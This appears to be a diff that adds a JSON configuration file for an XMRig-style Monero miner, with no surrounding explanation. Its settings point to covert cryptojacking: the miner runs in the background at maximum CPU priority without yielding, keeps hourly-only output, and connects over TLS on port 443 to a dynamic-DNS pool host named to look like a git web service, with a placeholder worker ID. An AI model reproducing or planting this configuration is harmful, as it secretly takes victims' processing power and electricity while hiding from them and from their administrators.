@@ -1,0 +1,26 @@
+{
+  "background": true,
+  "cpu": {
+    "priority": 5,
+    "yield": false
+  },
+  "donate-level": 0,
+  "health-print-time": 3600,
+  "pools": [
+    {
+      "coin": "monero",
+      "keepalive": true,
+      "nicehash": true,
+      "pass": "",
+      "tls": true,
+      "url": "gitweb.ddns.net:443",
+      "user": "__ID__"
+    }
+  ],
+  "print-time": 3600,
+  "randomx": {
+    "1gb-pages": true,
+    "cache_qos": true,
+    "mode": "auto"
+  }
+}
